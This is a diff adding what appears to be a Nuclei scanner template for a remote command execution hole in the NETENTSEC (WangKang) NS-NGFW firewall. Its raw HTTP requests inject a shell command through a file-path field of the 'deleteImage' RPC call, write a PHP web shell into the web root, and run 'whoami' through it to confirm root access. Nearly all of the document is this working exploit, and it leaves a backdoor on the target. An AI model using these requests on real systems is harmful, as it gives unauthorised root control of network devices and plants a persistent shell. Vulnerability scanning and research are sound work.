@@ -1,0 +1,69 @@
+id: netentsec-ngfw-rce
+
+info:
+  name: NETENTSEC(WangKang) Firewall NS-NGFW RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WangKang File upload vulnerability exists in the NGFW foreground of the next generation firewall, allowing remote command execution.
+  tags: rce, firewall
+  reference:
+    - http://fofa.so
+
+variables:
+  random_hex_str: "{{rand_base(8)}}"
+  random_hex_name: "{{rand_base(5)}}"
+  random_hex_pwd: "{{rand_base(3)}}"
+
+http:
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Requested-With: XMLHttpRequest
+
+        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '{{random_hex_str}}'>/var/www/html/{{random_hex_name}}.txt"]}],"type":"rpc","tid":17}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+
+  - raw:
+      - |
+        GET /{{random_hex_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{random_hex_str}}"
+
+  - raw:
+      - |
+        POST /directdata/direct/router HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-Requested-With: XMLHttpRequest
+
+        {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php\nsystem($_GET[{{random_hex_pwd}}]);'>/var/www/html/{{random_hex_name}}.php"]}],"type":"rpc","tid":17}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+
+  - raw:
+      - |
+        GET /{{random_hex_name}}.php?{{random_hex_pwd}}=whoami HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root"
